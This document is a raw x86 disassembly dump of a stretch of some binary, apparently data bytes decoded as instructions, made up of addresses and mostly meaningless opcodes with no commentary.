  44afa0:	add    BYTE PTR [edx],dl
  44afa2:	inc    DWORD PTR [eax]
  44afa4:	add    BYTE PTR [ecx],dl
  44afa6:	inc    DWORD PTR [eax]
  44afa8:	add    BYTE PTR [ecx],dl
  44afaa:	inc    DWORD PTR [eax]
  44afac:	add    BYTE PTR [edx],dl
  44afae:	inc    DWORD PTR [edx]
  44afb0:	add    DWORD PTR [ecx],edx
  44afb2:	inc    DWORD PTR [edx]
  44afb4:	add    BYTE PTR [eax],al
  44afb6:	inc    DWORD PTR ds:0xbff0f05
  44afbc:	adc    BYTE PTR [edi+edi*8+0x16],al
  44afc0:	sbb    al,0x9b
  44afc2:	call   FWORD PTR [edi]
  44afc4:	pop    ss
  44afc5:	jno    0x44afc6
  44afc7:	pop    ds
  44afc8:	sbb    ch,BYTE PTR [ebx-0x1]
  44afcb:	sbb    eax,0x15ff811c
  44afd0:	pop    ss
  44afd1:	arpl   di,di
  44afd3:	and    eax,0x23ff5320
  44afd8:	and    ebx,DWORD PTR [ebp-0x1]
  44afdb:	or     al,0x10
  44afdd:	xchg   esi,eax
  44afde:	inc    DWORD PTR [ecx]
  44afe0:	add    eax,0x101ffc8
  44afe5:	add    bh,bh
  44afe7:	add    BYTE PTR [eax],al
  44afe9:	sbb    edi,edi
  44afeb:	add    BYTE PTR [eax],al
  44afed:	sbb    bh,bh
  44afef:	add    BYTE PTR [eax],al
  44aff1:	adc    eax,0x180000ff
  44aff6:	inc    DWORD PTR [eax]
  44aff8:	add    BYTE PTR [edx],bl
  44affa:	inc    DWORD PTR [eax]
  44affc:	add    BYTE PTR [ecx],bl
  44affe:	inc    DWORD PTR [ecx]
  44b000:	add    BYTE PTR [ebx],al
  44b002:	inc    DWORD PTR [eax]
  44b004:	add    al,0x1a
  44b006:	dec    DWORD PTR [edx]
  44b008:	das    
  44b009:	(bad)  
  44b00b:	adc    ebx,DWORD PTR [esi]
  44b00d:	pusha  
  44b00e:	call   DWORD PTR [eax]
  44b010:	adc    al,0x38
  44b012:	call   DWORD PTR [eax]
  44b014:	nop    edi
  44b017:	adc    al,0x19
  44b019:	inc    esp
  44b01a:	inc    DWORD PTR [esi]
  44b01c:	or     al,BYTE PTR [ebx-0x1]
  44b01f:	add    BYTE PTR [eax],al
  44b021:	and    bh,bh
  44b023:	add    al,BYTE PTR [edx]
  44b025:	add    bh,bh
  44b027:	add    DWORD PTR [ecx],eax
  44b029:	add    bh,bh
  44b02b:	add    BYTE PTR [eax],al
  44b02d:	adc    eax,0x110000ff
  44b032:	inc    DWORD PTR [eax]
  44b034:	add    BYTE PTR [ebx],dl
  44b036:	inc    DWORD PTR [eax]
  44b038:	add    BYTE PTR ds:0x100000ff,dl
  44b03e:	inc    DWORD PTR [ecx]
  44b040:	add    DWORD PTR [eax],eax
  44b042:	inc    DWORD PTR [edx]
  44b044:	add    DWORD PTR ds:0x32100dff,eax
  44b04a:	dec    DWORD PTR [esi+ecx*1]
  44b04d:	inc    esp
  44b04e:	call   FWORD PTR [eax]
  44b050:	pop    ss
  44b051:	inc    edi
  44b052:	call   DWORD PTR ds:0xcff5015
  44b058:	(bad)  
  44b05b:	add    eax,0x1cff700a
  44b060:	and    BYTE PTR [edi+edi*8+0xd],bh
  44b064:	and    esi,esp
  44b066:	inc    DWORD PTR [ecx]
  44b068:	add    DWORD PTR [eax],eax
  44b06a:	inc    DWORD PTR [eax]
  44b06c:	add    BYTE PTR [ebx],cl
  44b06e:	inc    DWORD PTR [eax]
  44b070:	add    BYTE PTR [edx],cl
  44b072:	inc    DWORD PTR [ecx]
  44b074:	add    DWORD PTR [eax],eax
  44b076:	inc    DWORD PTR [edx]
  44b078:	add    eax,0x902ff42
  44b07d:	call   0x29ff:0x7e2b18ff
  44b084:	inc    ecx
  44b085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44b086:	jmp    DWORD PTR [eax]
  44b088:	cmp    bl,BYTE PTR [ebx-0x7dc3d201]
  44b08e:	call   DWORD PTR [esi]
  44b090:	adc    eax,0xc0bff6b
  44b095:	outs   dx,DWORD PTR ds:[esi]
  44b096:	inc    DWORD PTR [esi]
  44b098:	adc    DWORD PTR [ecx-0x1],esi
  44b09b:	add    al,BYTE PTR [edx]
  44b09d:	add    edi,edi
  44b09f:	add    BYTE PTR [eax],al
  44b0a1:	push   ss
  44b0a2:	inc    DWORD PTR [eax]
  44b0a4:	add    BYTE PTR [edi],cl
  44b0a6:	inc    DWORD PTR [eax]
  44b0a8:	add    BYTE PTR [edi],cl
  44b0aa:	inc    DWORD PTR [eax]
  44b0ac:	add    BYTE PTR [edi],cl
  44b0ae:	inc    DWORD PTR [eax]
  44b0b0:	add    BYTE PTR [edi],cl
  44b0b2:	inc    DWORD PTR [ecx]
  44b0b4:	add    DWORD PTR [esi],ecx
  44b0b6:	inc    DWORD PTR [ebx]
  44b0b8:	add    al,BYTE PTR [eax]
  44b0ba:	inc    DWORD PTR [edi]
  44b0bc:	pop    es
  44b0bd:	or     al,0xff
  44b0bf:	movups xmm5,XMMWORD PTR [edi+edi*8]
  44b0c3:	push   es
  44b0c4:	sbb    bl,dl
  44b0c6:	inc    DWORD PTR [edi]
  44b0c8:	sbb    dl,cl
  44b0ca:	dec    DWORD PTR [ebx]
  44b0cc:	sbb    al,0xd7
  44b0ce:	dec    DWORD PTR [ebx]
  44b0d0:	pop    ds
  44b0d1:	jmp    0xde63bfd5
  44b0d6:	dec    DWORD PTR [eax]
  44b0d8:	sbb    ah,ah
  44b0da:	dec    DWORD PTR [ecx]
  44b0dc:	sbb    edi,eax
  44b0de:	dec    DWORD PTR [eax]
  44b0e0:	pop    ss
  44b0e1:	fdivp  st(7),st
  44b0e3:	add    DWORD PTR [ecx],eax
  44b0e5:	add    bh,bh
  44b0e7:	add    BYTE PTR [eax],al
  44b0e9:	push   ss
  44b0ea:	inc    DWORD PTR [eax]
  44b0ec:	add    BYTE PTR [ecx],bl
  44b0ee:	inc    DWORD PTR [eax]
  44b0f0:	add    BYTE PTR [edi],dl
  44b0f2:	inc    DWORD PTR [eax]
  44b0f4:	add    BYTE PTR [eax],bl
  44b0f6:	inc    DWORD PTR [eax]
  44b0f8:	add    BYTE PTR [eax],bl
  44b0fa:	inc    DWORD PTR [eax]
  44b0fc:	add    BYTE PTR [edi+edi*8],dl
  44b0ff:	add    DWORD PTR [ecx],eax
  44b101:	add    bh,bh
  44b103:	add    DWORD PTR [ecx],eax
  44b105:	add    bh,bh
  44b107:	pop    es
  44b108:	sub    ch,ah
  44b10a:	call   DWORD PTR [ebx]
  44b10c:	and    ah,BYTE PTR [esi-0x1]
  44b10f:	adc    BYTE PTR ds:0x1311ff31,dl
  44b115:	xor    edi,edi
  44b117:	adc    BYTE PTR [ecx],dl
  44b119:	sub    bh,bh
  44b11b:	adc    al,0x17
  44b11d:	aaa    
  44b11e:	inc    DWORD PTR [esi]
  44b120:	push   es
  44b121:	inc    esi
  44b122:	inc    DWORD PTR [ecx]
  44b124:	add    DWORD PTR [eax],eax
  44b126:	inc    DWORD PTR [ecx]
  44b128:	add    DWORD PTR [eax],eax
  44b12a:	inc    DWORD PTR [eax]
  44b12c:	add    BYTE PTR [eax],dl
  44b12e:	inc    DWORD PTR [eax]
  44b130:	add    BYTE PTR [edi],cl
  44b132:	inc    DWORD PTR [eax]
  44b134:	add    BYTE PTR [ebx],dl
  44b136:	inc    DWORD PTR [eax]
  44b138:	add    BYTE PTR [ecx],dl
  44b13a:	inc    DWORD PTR [eax]
  44b13c:	add    BYTE PTR [esi],cl
  44b13e:	inc    DWORD PTR [ecx]
  44b140:	add    DWORD PTR [eax],eax
  44b142:	inc    DWORD PTR [edx]
  44b144:	add    al,BYTE PTR [ebx]
  44b146:	dec    DWORD PTR [edi]
  44b148:	adc    al,0x49
  44b14a:	dec    DWORD PTR [ebx]
  44b14c:	or     eax,0xb11ff3b
  44b151:	and    al,0xff
  44b153:	sbb    BYTE PTR [edx],dl
  44b155:	das    
  44b156:	dec    DWORD PTR [edx]
  44b158:	push   es
  44b159:	push   ds
  44b15a:	inc    DWORD PTR [eax]
  44b15c:	add    eax,0x2714ff6d
  44b161:	out    0xff,al
  44b163:	or     eax,0x1ffe521
  44b168:	add    DWORD PTR [eax],eax
  44b16a:	inc    DWORD PTR [eax]
  44b16c:	add    BYTE PTR [ecx],cl
  44b16e:	inc    DWORD PTR [eax]
  44b170:	add    BYTE PTR [ebx],cl
  44b172:	inc    DWORD PTR [ecx]
  44b174:	add    DWORD PTR [eax],eax
  44b176:	inc    DWORD PTR [eax]
  44b178:	add    esi,DWORD PTR [edi+edi*8]
  44b17b:	add    DWORD PTR [esi],eax
  44b17d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44b17e:	call   FWORD PTR [ecx]
  44b180:	and    bl,BYTE PTR [ebx-0x1]
  44b183:	sub    DWORD PTR ds:0x3621ff96,edi
  44b189:	xchg   edx,eax
  44b18a:	jmp    FWORD PTR [esi]
  44b18c:	aas    
  44b18d:	xchg   esp,eax
  44b18e:	jmp    FWORD PTR [ecx]
  44b190:	sub    BYTE PTR [ebp-0x1],dh
  44b193:	or     al,0x11
  44b195:	mov    cl,0xff
  44b197:	add    eax,0x3ff9a13
  44b19c:	add    al,0x1
  44b19e:	inc    DWORD PTR [eax]
  44b1a0:	add    BYTE PTR [edi],bl
  44b1a2:	inc    DWORD PTR [eax]
  44b1a4:	add    BYTE PTR ds:0xe0000ff,cl
  44b1aa:	inc    DWORD PTR [eax]
  44b1ac:	add    BYTE PTR [esi],cl
  44b1ae:	inc    DWORD PTR [eax]
  44b1b0:	add    BYTE PTR [esi],cl
  44b1b2:	inc    DWORD PTR [eax]
  44b1b4:	add    BYTE PTR ds:0xe0000ff,cl
  44b1ba:	inc    DWORD PTR [eax]
  44b1bc:	add    BYTE PTR [edi],dl
  44b1be:	inc    DWORD PTR [eax]
  44b1c0:	add    BYTE PTR [ecx],dh
  44b1c2:	inc    DWORD PTR [eax]
  44b1c4:	add    BYTE PTR [ebx-0x1],cl
  44b1c7:	add    BYTE PTR [eax],al
  44b1c9:	push   esp
  44b1ca:	inc    DWORD PTR [eax]
  44b1cc:	add    BYTE PTR [edi+edi*8+0x2],dl
  44b1d0:	add    cl,BYTE PTR [eax]
  44b1d2:	inc    DWORD PTR [eax]
  44b1d4:	add    BYTE PTR [ecx],cl
  44b1d6:	inc    DWORD PTR [ecx]
  44b1d8:	add    DWORD PTR [ebx],edx
  44b1da:	inc    DWORD PTR [edx]
  44b1dc:	add    ah,BYTE PTR [ecx]
  44b1de:	inc    DWORD PTR [ecx]
  44b1e0:	add    DWORD PTR ds:0x101ff,ecx
  44b1e6:	inc    DWORD PTR [eax]
  44b1e8:	add    BYTE PTR ds:0x150000ff,dl
  44b1ee:	inc    DWORD PTR [eax]
  44b1f0:	add    BYTE PTR [esi],dl
  44b1f2:	inc    DWORD PTR [eax]
  44b1f4:	add    BYTE PTR [esi],dl
  44b1f6:	inc    DWORD PTR [eax]
  44b1f8:	add    BYTE PTR [edi+edi*8],dl
  44b1fb:	add    BYTE PTR [eax],al
  44b1fd:	adc    al,0xff
  44b1ff:	add    BYTE PTR [ecx],al
  44b201:	add    bh,bh
  44b203:	add    DWORD PTR [ecx],eax
  44b205:	add    bh,bh
  44b207:	pop    es
  44b208:	and    ah,dl
  44b20a:	dec    DWORD PTR [ebx]
  44b20c:	sbb    bh,BYTE PTR [edi-0x1]
  44b20f:	or     cl,BYTE PTR [edi]
  44b211:	xor    edi,edi
  44b213:	adc    dl,BYTE PTR [ecx]
  44b215:	sub    edi,edi
  44b217:	push   cs
  44b218:	(bad)  
  44b21a:	call   DWORD PTR [esi]
  44b21c:	pop    ss
  44b21d:	aas    
  44b21e:	dec    DWORD PTR [eax]
  44b220:	or     BYTE PTR [edx-0x1],cl
  44b223:	add    BYTE PTR [eax],al
  44b225:	add    eax,0x101ff
  44b22a:	inc    DWORD PTR [eax]
  44b22c:	add    BYTE PTR [eax],dl
  44b22e:	inc    DWORD PTR [eax]
  44b230:	add    BYTE PTR [edi],cl
  44b232:	inc    DWORD PTR [eax]
  44b234:	add    BYTE PTR [edi],cl
  44b236:	inc    DWORD PTR [eax]
  44b238:	add    BYTE PTR [esi],cl
  44b23a:	inc    DWORD PTR [eax]
  44b23c:	add    BYTE PTR ds:0x101ff,cl
  44b242:	inc    DWORD PTR [edx]
  44b244:	add    DWORD PTR [eax],eax
  44b246:	dec    DWORD PTR [ebx]
  44b248:	adc    DWORD PTR [ecx],edi
  44b24a:	call   DWORD PTR [esp+edx*1]
  44b24d:	xor    eax,0x32171bff
  44b252:	call   FWORD PTR [edx]
  44b254:	adc    ch,BYTE PTR [ebx]
  44b256:	call   DWORD PTR [ebx]
  44b258:	comiss xmm7,xmm7
  44b25b:	add    al,0x5
  44b25d:	dec    edi
  44b25e:	dec    DWORD PTR [esi]
  44b260:	and    esi,esp
  44b262:	dec    DWORD PTR [esi]
  44b264:	and    al,0xe8
  44b266:	inc    DWORD PTR [ecx]
  44b268:	add    DWORD PTR [eax],eax
  44b26a:	inc    DWORD PTR [eax]
  44b26c:	add    BYTE PTR [ecx],cl
  44b26e:	inc    DWORD PTR [eax]
  44b270:	add    BYTE PTR [eax],cl
  44b272:	inc    DWORD PTR [ecx]
  44b274:	add    DWORD PTR [eax],eax
  44b276:	inc    DWORD PTR [esi]
  44b278:	or     eax,0xc03ff39
  44b27d:	mov    ds:0x461d19ff,al
  44b282:	jmp    DWORD PTR ds:0x1cff7f36
  44b288:	sub    al,0x72
  44b28a:	jmp    DWORD PTR [edi]
  44b28c:	xor    al,0x7b
  44b28e:	call   FWORD PTR [edx]
  44b290:	sbb    al,0x4d
  44b292:	call   FWORD PTR [ebx]
  44b294:	sbb    ah,BYTE PTR [esi-0x1]
  44b297:	add    al,0x15
  44b299:	jmp    0x3ff:0x210707ff
  44b2a0:	add    al,BYTE PTR [eax]
  44b2a2:	inc    DWORD PTR [eax]
  44b2a4:	add    BYTE PTR [esi],cl
  44b2a6:	inc    DWORD PTR [eax]
  44b2a8:	add    BYTE PTR ds:0xd0000ff,cl
  44b2ae:	inc    DWORD PTR [eax]
  44b2b0:	add    BYTE PTR ds:0xf0000ff,cl
  44b2b6:	inc    DWORD PTR [eax]
  44b2b8:	add    BYTE PTR [esi],cl
  44b2ba:	inc    DWORD PTR [eax]
  44b2bc:	add    BYTE PTR [eax],dl
  44b2be:	inc    DWORD PTR [eax]
  44b2c0:	add    BYTE PTR [eax],dl
  44b2c2:	inc    DWORD PTR [eax]
  44b2c4:	add    BYTE PTR [ecx],dl
  44b2c6:	inc    DWORD PTR [eax]
  44b2c8:	add    BYTE PTR [ecx],dl
  44b2ca:	inc    DWORD PTR [eax]
  44b2cc:	add    BYTE PTR [edi],cl
  44b2ce:	inc    DWORD PTR [eax]
  44b2d0:	add    BYTE PTR [eax],dl
  44b2d2:	inc    DWORD PTR [eax]
  44b2d4:	add    BYTE PTR [eax],dl
  44b2d6:	inc    DWORD PTR [eax]
  44b2d8:	add    BYTE PTR [ebx],dl
  44b2da:	inc    DWORD PTR [eax]
  44b2dc:	add    BYTE PTR [ebx],dl
  44b2de:	inc    DWORD PTR [eax]
  44b2e0:	add    BYTE PTR [ebx],dl
  44b2e2:	inc    DWORD PTR [ebx+eax*1]
  44b2e5:	adc    bh,bh
  44b2e7:	add    BYTE PTR [eax],al
  44b2e9:	adc    edi,edi
  44b2eb:	add    BYTE PTR [eax],al
  44b2ed:	adc    edi,edi
  44b2ef:	add    BYTE PTR [eax],al
  44b2f1:	adc    edi,edi
  44b2f3:	add    BYTE PTR [eax],al
  44b2f5:	push   ss
  44b2f6:	inc    DWORD PTR [eax]
  44b2f8:	add    BYTE PTR [edi+edi*8],dl
  44b2fb:	add    BYTE PTR [eax],al
  44b2fd:	adc    edi,edi
  44b2ff:	add    DWORD PTR [eax],eax
  44b301:	add    bh,bh
  44b303:	add    DWORD PTR [ecx],eax
  44b305:	add    edi,edi
  44b307:	or     al,0x24
  44b309:	(bad)  
  44b30c:	sbb    edi,DWORD PTR [esi-0x1]
  44b30f:	add    BYTE PTR [edx],cl
  44b311:	dec    ecx
  44b312:	dec    DWORD PTR [edx+ecx*1]
  44b315:	and    edi,edi
  44b317:	adc    dl,BYTE PTR [esi]
  44b319:	xor    bh,bh
  44b31b:	adc    BYTE PTR [esi],cl
  44b31d:	aaa    
  44b31e:	inc    DWORD PTR ds:0xff4808
  44b324:	add    eax,0x101ff35
  44b329:	add    bh,bh
  44b32b:	add    BYTE PTR [eax],al
  44b32d:	ud0    eax,DWORD PTR [eax]
  44b330:	add    BYTE PTR [edi],cl
  44b332:	inc    DWORD PTR [eax]
  44b334:	add    BYTE PTR [edi+edi*8],cl
  44b337:	add    BYTE PTR [eax],al
  44b339:	or     al,0xff
  44b33b:	add    BYTE PTR [eax],al
  44b33d:	or     eax,0x101ff
  44b342:	inc    DWORD PTR [esp+ecx*1]
  44b345:	inc    ebx
  44b346:	dec    DWORD PTR [edi]
  44b348:	adc    DWORD PTR [esi-0x1],eax
  44b34b:	pop    ds
  44b34c:	sbb    eax,0x2029ff37
  44b351:	notrack jmp DWORD PTR [ebx]
  44b354:	sbb    eax,0x1f23ff38
  44b359:	dec    esi
  44b35a:	dec    DWORD PTR [edx]
  44b35c:	or     DWORD PTR [edi+edi*8],esi
  44b35f:	push   cs
  44b360:	and    al,dl
  44b362:	dec    DWORD PTR [eax+eiz*1]
  44b365:	loop   0x44b366
  44b367:	add    DWORD PTR [ecx],eax
  44b369:	add    bh,bh
  44b36b:	add    BYTE PTR [eax],al
  44b36d:	or     edi,edi
  44b36f:	add    BYTE PTR [eax],al
  44b371:	push   es
  44b372:	inc    DWORD PTR [ecx]
  44b374:	add    DWORD PTR [eax],eax
  44b376:	inc    DWORD PTR [esi]
  44b378:	adc    BYTE PTR [ecx-0x1],bl
  44b37b:	add    al,0xd
  44b37d:	cmp    edi,0x22
  44b380:	push   ds
  44b381:	aaa    
  44b382:	jmp    DWORD PTR [eax]
  44b384:	and    al,0x47
  44b386:	call   FWORD PTR [eax]
  44b388:	pop    ds
  44b389:	push   ebp
  44b38a:	jmp    FWORD PTR [eax]
  44b38c:	xor    cl,BYTE PTR [ebx+0x73241bff]
  44b392:	call   FWORD PTR ds:0xcff311b
  44b398:	sub    al,0xe3
  44b39a:	dec    DWORD PTR [ebx]
  44b39c:	adc    al,0x8c
  44b39e:	inc    DWORD PTR [ecx]
  44b3a0:	add    DWORD PTR [eax],eax
  44b3a2:	inc    DWORD PTR [eax]
  44b3a4:	add    BYTE PTR [edi+edi*8],cl
  44b3a7:	add    BYTE PTR [eax],al
  44b3a9:	or     edi,edi
  44b3ab:	add    BYTE PTR [eax],al
  44b3ad:	or     edi,edi
  44b3af:	add    BYTE PTR [eax],al
  44b3b1:	or     al,0xff
  44b3b3:	add    BYTE PTR [eax],al
  44b3b5:	or     al,0xff
  44b3b7:	add    BYTE PTR [eax],al
  44b3b9:	or     al,0xff
  44b3bb:	add    BYTE PTR [eax],al
  44b3bd:	ud0    eax,DWORD PTR [eax]
  44b3c0:	add    BYTE PTR [ecx],dl
  44b3c2:	inc    DWORD PTR [eax]
  44b3c4:	add    BYTE PTR [eax],dl
  44b3c6:	inc    DWORD PTR [eax]
  44b3c8:	add    BYTE PTR [ecx],dl
  44b3ca:	inc    DWORD PTR [eax]
  44b3cc:	add    BYTE PTR [edx],dl
  44b3ce:	inc    DWORD PTR [eax]
  44b3d0:	add    BYTE PTR [eax],dl
  44b3d2:	inc    DWORD PTR [eax]
  44b3d4:	add    BYTE PTR [eax],dl
  44b3d6:	inc    DWORD PTR [eax]
  44b3d8:	add    BYTE PTR [edi],cl
  44b3da:	inc    DWORD PTR [eax]
  44b3dc:	add    BYTE PTR [edi],cl
  44b3de:	inc    DWORD PTR [eax]
  44b3e0:	add    BYTE PTR [eax],dl
  44b3e2:	inc    DWORD PTR [eax]
  44b3e4:	add    BYTE PTR [eax],dl
  44b3e6:	inc    DWORD PTR [eax]
  44b3e8:	add    BYTE PTR [edi],cl
  44b3ea:	inc    DWORD PTR [eax]
  44b3ec:	add    BYTE PTR [edi],cl
  44b3ee:	inc    DWORD PTR [eax]
  44b3f0:	add    BYTE PTR [eax],dl
  44b3f2:	inc    DWORD PTR [eax]
  44b3f4:	add    BYTE PTR [ecx],dl
  44b3f6:	inc    DWORD PTR [eax]
  44b3f8:	add    BYTE PTR [ecx],dl
  44b3fa:	inc    DWORD PTR [eax]
  44b3fc:	add    BYTE PTR [edi],cl
  44b3fe:	inc    DWORD PTR [ecx]
  44b400:	add    DWORD PTR [edx],eax
  44b402:	inc    DWORD PTR [ecx]
  44b404:	add    DWORD PTR [eax],eax
  44b406:	inc    DWORD PTR [esi]
  44b408:	sbb    al,bh
  44b40a:	inc    DWORD PTR [ebx]
  44b40c:	pop    es
  44b40d:	arpl   di,di
  44b40f:	add    BYTE PTR [edx+ecx*2],al
  44b412:	dec    DWORD PTR [esi]
  44b414:	adc    esi,DWORD PTR [ebx]
  44b416:	call   DWORD PTR [eax]
  44b418:	adc    ch,BYTE PTR [ebx]
  44b41a:	dec    DWORD PTR [edi]
  44b41c:	push   cs
  44b41d:	aaa    
  44b41e:	inc    DWORD PTR ds:0x2ff5a0d
  44b424:	push   cs
  44b425:	pop    eax
  44b426:	inc    DWORD PTR [ecx]
  44b428:	add    DWORD PTR [eax],eax
  44b42a:	inc    DWORD PTR [eax]
  44b42c:	add    BYTE PTR [edi],cl
  44b42e:	inc    DWORD PTR [eax]
  44b430:	add    BYTE PTR ds:0xb0000ff,cl
  44b436:	inc    DWORD PTR [eax]
  44b438:	add    BYTE PTR [edx],cl
  44b43a:	inc    DWORD PTR [eax]
  44b43c:	add    BYTE PTR [ebx],cl
  44b43e:	inc    DWORD PTR [ecx]
  44b440:	add    DWORD PTR [eax],eax
  44b442:	dec    DWORD PTR [eax]
  44b444:	push   ss
  44b445:	mov    ?,edi
  44b447:	sub    BYTE PTR es:[edi-0x1],dl
  44b44b:	and    esp,DWORD PTR [ecx]
  44b44d:	pop    esp
  44b44e:	jmp    FWORD PTR ds:0x2fff4629
  44b454:	sub    DWORD PTR [eax-0x1],eax
  44b457:	and    eax,0x32ff6b21
  44b45c:	xor    dh,BYTE PTR [eax+0x2e0907ff]
  44b462:	inc    DWORD PTR [eax]
  44b464:	add    al,0xf
  44b466:	inc    DWORD PTR [ecx]
  44b468:	add    DWORD PTR [eax],eax
  44b46a:	inc    DWORD PTR [eax]
  44b46c:	add    BYTE PTR [eax],cl
  44b46e:	inc    DWORD PTR [eax]
  44b470:	add    BYTE PTR [esi],al
  44b472:	inc    DWORD PTR [ecx]
  44b474:	add    DWORD PTR [eax],eax
  44b476:	inc    DWORD PTR [eax]
  44b478:	add    bl,BYTE PTR [esi-0x1]
  44b47b:	or     BYTE PTR [edi],al
  44b47d:	jl     0x44b47e
  44b47f:	sub    al,0x22
  44b481:	xor    al,0xff
  44b483:	sbb    eax,0x1cff2b1b
  44b488:	sbb    bh,BYTE PTR [ebx]
  44b48a:	jmp    FWORD PTR [ecx]
  44b48c:	sub    edx,DWORD PTR [edx-0x77d1de01]
  44b492:	dec    DWORD PTR [edi]
  44b494:	xor    edi,DWORD PTR [eax-0x6ae9fc01]
  44b49a:	inc    DWORD PTR [edi]
  44b49c:	(bad)  
  44b49e:	inc    DWORD PTR [ecx]
  44b4a0:	add    DWORD PTR [eax],eax
  44b4a2:	inc    DWORD PTR [esi]
  44b4a4:	push   es
  44b4a5:	or     edi,edi
  44b4a7:	add    BYTE PTR [eax],al
  44b4a9:	or     bh,bh
  44b4ab:	add    BYTE PTR [eax],al
  44b4ad:	or     al,0xff
  44b4af:	add    BYTE PTR [eax],al
  44b4b1:	or     edi,edi
  44b4b3:	add    BYTE PTR [eax],al
  44b4b5:	or     edi,edi
  44b4b7:	add    BYTE PTR [eax],al
  44b4b9:	or     edi,edi
  44b4bb:	add    BYTE PTR [eax],al
  44b4bd:	push   cs
  44b4be:	inc    DWORD PTR [eax]
  44b4c0:	add    BYTE PTR [eax],dl
  44b4c2:	inc    DWORD PTR [eax]
  44b4c4:	add    BYTE PTR [edi],cl
  44b4c6:	inc    DWORD PTR [eax]
  44b4c8:	add    BYTE PTR [eax],dl
  44b4ca:	inc    DWORD PTR [eax]
  44b4cc:	add    BYTE PTR [eax],dl
  44b4ce:	inc    DWORD PTR [eax]
  44b4d0:	add    BYTE PTR [eax],dl
  44b4d2:	inc    DWORD PTR [eax]
  44b4d4:	add    BYTE PTR [ecx],dl
  44b4d6:	inc    DWORD PTR [eax]
  44b4d8:	add    BYTE PTR [edi],cl
  44b4da:	inc    DWORD PTR [ecx]
  44b4dc:	add    DWORD PTR [ecx],ecx
  44b4de:	inc    DWORD PTR [ecx]
  44b4e0:	add    DWORD PTR [eax],ecx
  44b4e2:	inc    DWORD PTR [ecx]
  44b4e4:	add    DWORD PTR [ebx],ecx
  44b4e6:	inc    DWORD PTR [eax]
  44b4e8:	add    BYTE PTR [edi],cl
  44b4ea:	inc    DWORD PTR [eax]
  44b4ec:	add    BYTE PTR [esi],cl
  44b4ee:	inc    DWORD PTR [eax]
  44b4f0:	add    BYTE PTR [edi],cl
  44b4f2:	inc    DWORD PTR [eax]
  44b4f4:	add    BYTE PTR [edi],cl
  44b4f6:	inc    DWORD PTR [eax]
  44b4f8:	add    BYTE PTR [edi],cl
  44b4fa:	inc    DWORD PTR [eax]
  44b4fc:	add    BYTE PTR [edi],cl
  44b4fe:	inc    DWORD PTR [eax]
  44b500:	add    DWORD PTR [ecx],eax
  44b502:	inc    DWORD PTR [ecx]
  44b504:	add    DWORD PTR [eax],eax
  44b506:	dec    DWORD PTR [ecx]
  44b508:	and    DWORD PTR [ebp+0x240501ff],esi
  44b50e:	inc    DWORD PTR ds:0x10ff480a
  44b514:	adc    al,BYTE PTR [ecx-0x1]
  44b517:	adc    edx,DWORD PTR [esi]
  44b519:	xor    al,0xff
  44b51b:	or     eax,0xbff2e0e
  44b520:	sbb    eax,0xf03ff7b
  44b525:	inc    WORD PTR [ecx]
  44b528:	add    DWORD PTR [eax],eax
  44b52a:	inc    DWORD PTR [eax]
  44b52c:	add    BYTE PTR [ebx],cl
  44b52e:	inc    DWORD PTR [eax]
  44b530:	add    BYTE PTR [ebx],cl
  44b532:	inc    DWORD PTR [eax]
  44b534:	add    BYTE PTR [edx],cl
  44b536:	inc    DWORD PTR [eax]
  44b538:	add    BYTE PTR [ecx],cl
  44b53a:	inc    DWORD PTR [edx]
  44b53c:	add    al,BYTE PTR [edi]
  44b53e:	inc    DWORD PTR [ecx]
  44b540:	add    DWORD PTR [eax],eax
  44b542:	dec    DWORD PTR [eax]
  44b544:	adc    ch,BYTE PTR [edx-0x1]
  44b547:	and    eax,0x2eff5629
  44b54c:	daa    
  44b54d:	fs (bad) 
  44b54f:	cmp    eax,0x25ff4f2c
  44b554:	sbb    eax,0xb0fff29
  44b559:	cmp    bh,bh
  44b55b:	and    BYTE PTR [eax],bl
  44b55d:	imul   edi,edi,0xc
  44b560:	xor    BYTE PTR [esi+0xf0301ff],dh
  44b566:	inc    DWORD PTR [ecx]
  44b568:	add    DWORD PTR [eax],eax
  44b56a:	inc    DWORD PTR [eax]
  44b56c:	add    BYTE PTR [edi],al
  44b56e:	inc    DWORD PTR [eax]
  44b570:	add    BYTE PTR ds:0x101ff,al
  44b576:	inc    DWORD PTR [edx]
  44b578:	add    eax,0xb0dff52
  44b57d:	push   0x18121aff
  44b582:	call   FWORD PTR ds:0x1cff2417
  44b588:	sbb    BYTE PTR [ebx],dh
  44b58a:	jmp    DWORD PTR [eax+ebp*1]
  44b58d:	xchg   esp,eax
  44b58e:	call   DWORD PTR [ebx]
  44b590:	pop    ds
  44b591:	jae    0x44b592
  44b593:	add    DWORD PTR [edx],ecx
  44b595:	jb     0x44b596
  44b597:	add    al,0x7
  44b599:	push   esi
  44b59a:	inc    DWORD PTR [ecx]
  44b59c:	add    DWORD PTR [esi],ebx
  44b59e:	inc    DWORD PTR [ecx]
  44b5a0:	add    DWORD PTR [eax],eax
  44b5a2:	inc    DWORD PTR [ecx]
  44b5a4:	add    DWORD PTR [eax],eax
  44b5a6:	inc    DWORD PTR [eax]
  44b5a8:	add    BYTE PTR [edx],cl
  44b5aa:	inc    DWORD PTR [eax]
  44b5ac:	add    BYTE PTR [ebx],cl
  44b5ae:	inc    DWORD PTR [eax]
  44b5b0:	add    BYTE PTR ds:0xd0000ff,cl
  44b5b6:	inc    DWORD PTR [eax]
  44b5b8:	add    BYTE PTR [edi+edi*8],cl
  44b5bb:	add    BYTE PTR [eax],al
  44b5bd:	or     al,0xff
  44b5bf:	add    BYTE PTR [eax],al
  44b5c1:	or     eax,0xe0000ff
  44b5c6:	inc    DWORD PTR [eax]
  44b5c8:	add    BYTE PTR [esi],cl
  44b5ca:	inc    DWORD PTR [eax]
  44b5cc:	add    BYTE PTR [edi+edi*8],cl
  44b5cf:	add    BYTE PTR [eax],al
  44b5d1:	or     eax,0xf0000ff
  44b5d6:	inc    DWORD PTR [ecx]
  44b5d8:	add    DWORD PTR [eax],eax
  44b5da:	inc    DWORD PTR [ecx]
  44b5dc:	add    DWORD PTR [eax],eax
  44b5de:	inc    DWORD PTR [ecx]
  44b5e0:	add    DWORD PTR [eax],eax
  44b5e2:	inc    DWORD PTR [ecx]
  44b5e4:	add    DWORD PTR [eax],eax
  44b5e6:	inc    DWORD PTR [eax]
  44b5e8:	add    BYTE PTR [eax],dl
  44b5ea:	inc    DWORD PTR [eax]
  44b5ec:	add    BYTE PTR [edi],cl
  44b5ee:	inc    DWORD PTR [eax]
  44b5f0:	add    BYTE PTR [edi],cl
